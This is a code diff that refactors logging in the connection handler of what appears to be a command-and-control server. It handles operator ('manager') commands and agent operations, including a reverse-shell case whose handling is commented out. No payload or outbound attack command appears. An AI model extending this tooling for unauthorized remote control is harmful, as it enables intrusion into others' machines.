@@ -2,7 +2,6 @@
 
 /*constructor for the connection instance*/
 ConnectionInstance::ConnectionInstance(class Server *server){
-    this->logger = new Log(server->get_log()->get_mutex());
     this->server = server;
     this->data = nullptr;
 }
@@ -41,7 +40,6 @@ void ConnectionInstance::manager_handler() {
         memset(tmpbf, 0, sizeof(tmpbf));
         
         // get operation request
-        printf("Waiting for read\n");
         this->transport->read(&resp, 2048);
         
         // parse it
@@ -49,7 +47,7 @@ void ConnectionInstance::manager_handler() {
         operation = atoi(tmpbf);
         ptr += 3;
 
-        this->logger->log("Manager %s: Operation caught: %d\n", data->id, operation);
+        this->log("Manager %s: Operation caught: %d\n", data->id, operation);
 
         // main switch
         switch (operation)
@@ -66,7 +64,7 @@ void ConnectionInstance::manager_handler() {
             // Agent_id is stored in ptr
             d_ptr = strchr(ptr, ':') +1;
             if(d_ptr == NULL){
-                this->logger->log("Manager %d: Caught wrong format identifier in input\n", this->data->id);
+                this->log("Manager %d: Caught wrong format identifier in input\n", this->data->id);
                 return;
             }
             count = misc_index_of(ptr, ':', 0);
@@ -84,7 +82,7 @@ void ConnectionInstance::manager_handler() {
             // Agent_id is stored in ptr 
             d_ptr = strchr(ptr, ':') +1;
             if(d_ptr == NULL){
-                this->logger->log("Manager %s: Wrong format identifier from input\n", this->data->id);
+                this->log("Manager %s: Wrong format identifier from input\n", this->data->id);
                 return;
             }
             count = misc_index_of(ptr, ':', 0);
@@ -104,7 +102,7 @@ void ConnectionInstance::manager_handler() {
             // by the end, filename is in d_ptr and agent is in dat_ptr
             d_ptr = strchr(ptr, ':') +1;
             if(d_ptr == NULL){
-                this->logger->log("Manager %s: Wrong format identifier from input\n", this->data->id);
+                this->log("Manager %s: Wrong format identifier from input\n", this->data->id);
                 return;
             }
             count = misc_index_of(ptr, ':', 0);
@@ -116,7 +114,7 @@ void ConnectionInstance::manager_handler() {
         case MANAG_TASK_SC:
             d_ptr = strchr(ptr, ':') +1;
             if(d_ptr == NULL){
-                this->logger->log("Manager %s: Wrong format identifier from input\n", this->data->id);
+                this->log("Manager %s: Wrong format identifier from input\n", this->data->id);
                 return;
             }
             count = misc_index_of(ptr, ':', 0);
@@ -129,7 +127,7 @@ void ConnectionInstance::manager_handler() {
         case MANAG_GET_AGENT:
             d_ptr = strchr(ptr, ':') +1;
             if(d_ptr == NULL){
-                this->logger->log("Manager %s: Wrong format identifier from input\n", this->data->id);
+                this->log("Manager %s: Wrong format identifier from input\n", this->data->id);
                 return;
             }
             count = misc_index_of(ptr, ':', 0);
@@ -165,7 +163,7 @@ void ConnectionInstance::manager_handler() {
             break;
 
         default:
-            this->logger->log("Manager %s: Unknown operation value '%d'\n", this->data->id, operation);
+            this->log("Manager %s: Unknown operation value '%d'\n", this->data->id, operation);
             this->transport->send_err();
             break;
         }
@@ -423,13 +421,13 @@ void ConnectionInstance::agent_handler(){
                 NULL
         */
 
-        this->logger->log("Client %s: Operation caught: %d\n", this->data->id, operation);
+        this->log("Client %s: Operation caught: %d\n", this->data->id, operation);
 
         // main decision switch
         switch (operation)
         {
         case AGENT_EXIT:
-            this->logger->log("Client %s: Client exiting...\n", data->id); 
+            this->log("Client %s: Client exiting...\n", data->id); 
             quitting = 1;
             break;
 
@@ -443,7 +441,7 @@ void ConnectionInstance::agent_handler(){
             break;
 
         case AGENT_REV_SHELL:
-            this->logger->log("Client %s: Agent reverse shell caught\n", this->data->id);
+            this->log("Client %s: Agent reverse shell caught\n", this->data->id);
             //this->server->get_shell_queue()->push(this);
             //this->reverse_shell();
             break;
@@ -454,7 +452,7 @@ void ConnectionInstance::agent_handler(){
             break;
 
         default:
-            this->logger->log("Client %s: Unknown Operation Identifier: '%d'\n", this->data->id, operation);
+            this->log("Client %s: Unknown Operation Identifier: '%d'\n", this->data->id, operation);
             this->transport->send_err();
             quitting = 1;
             break;
@@ -467,17 +465,11 @@ void ConnectionInstance::shell_finish(){
     this->shell_finished = 1;
 }
 
-void ConnectionInstance::reload_logger(){
-    delete this->logger;
-    this->logger = new Log(this->logger->get_mutex());
-}
-
 /*Initialized the connection and prepares data structures for handlers*/
 void *ConnectionInstance::handle_connection(void *input){
     class ConnectionInstance *instance = (class ConnectionInstance *)input;
     
     // reload the logger because of threads not sharing stacks
-    instance->reload_logger();
     instance->get_transport()->listen();
     
 
@@ -497,7 +489,7 @@ void *ConnectionInstance::handle_connection(void *input){
     } else
     {
         // failed to handle the parsing :)
-        instance->logger->log("Connection Instance %d: Got Unknown Handler Type: %d\n", 0, handler);
+        instance->log("Connection Instance %d: Got Unknown Handler Type: %d\n", 0, handler);
     }
     return NULL;
 }
